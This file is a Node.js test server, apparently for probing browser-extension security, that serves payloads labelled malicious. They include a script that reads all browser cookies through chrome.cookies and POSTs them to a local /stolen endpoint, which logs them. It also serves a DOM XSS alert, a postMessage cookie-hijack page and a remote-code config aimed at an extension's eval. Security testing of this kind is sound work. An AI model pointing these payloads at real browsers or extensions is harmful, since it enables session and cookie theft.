#!/usr/bin/env node
import http from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = 8000;

// Malicious payloads
const payloads = {
  '/payload.js': `
    console.log('[ATTACK] Executed remote payload via eval()');
    // Try to steal cookies
    try {
      chrome.cookies.getAll({}, cookies => {
        console.log('[ATTACK] Stole', cookies.length, 'cookies');
        fetch('http://localhost:8000/stolen', {
          method: 'POST',
          body: JSON.stringify(cookies)
        });
      });
    } catch(e) {
      console.log('[ATTACK] Cookie theft failed:', e.message);
    }
  `,
  
  '/domxss.js': `
    alert('XSS executed!');
    console.log('[ATTACK] DOM XSS successful');
  `
};

// Test pages
const testPagePath = path.join(__dirname, 'test-pages/message-hijack.html');
const testPages = {};
if (fs.existsSync(testPagePath)) {
  testPages['/test/message-hijack'] = fs.readFileSync(testPagePath, 'utf8');
} else {
  // If file doesn't exist, create embedded HTML content
  testPages['/test/message-hijack'] = `
<!DOCTYPE html>
<html>
<head>
    <title>Message Hijack Test</title>
</head>
<body>
    <h1>Message Hijack Test Page</h1>
    <script>
        setTimeout(() => {
            window.postMessage({
                action: 'getCookies',
                domain: 'example.com'
            }, '*');
            console.log('Sent getCookies message');
        }, 1000);
        
        window.addEventListener('message', (e) => {
            if (e.data && e.data.cookies) {
                console.log('Received cookies:', e.data.cookies);
            }
        });
    </script>
</body>
</html>`;
}

const server = http.createServer((req, res) => {
  console.log(`[SERVER] ${req.method} ${req.url}`);
  
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }
  
  if (payloads[req.url]) {
    res.writeHead(200, { 'Content-Type': 'application/javascript' });
    res.end(payloads[req.url]);
  } else if (testPages[req.url]) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(testPages[req.url]);
  } else if (req.url === '/config') {
    // Serve configuration for modify-header extension
    const config = {
      active: true,
      payload: `
        console.log('[modify-header] Malicious payload executed!');
        console.error('[modify-header] Attack successful in MV3!');
        alert('[modify-header] If you see this, MV3 was bypassed!');
      `
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(config));
  } else if (req.url === '/stolen' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      console.log('[STOLEN DATA]', body);
      res.writeHead(200);
      res.end('OK');
    });
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

server.listen(PORT, () => {
  console.log(`🚀 Test server running on http://localhost:${PORT}`);
  console.log('Available endpoints:');
  Object.keys(payloads).forEach(p => console.log(`  - http://localhost:${PORT}${p}`));
  Object.keys(testPages).forEach(p => console.log(`  - http://localhost:${PORT}${p}`));
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n👋 Shutting down server...');
  server.close(() => process.exit(0));
}); 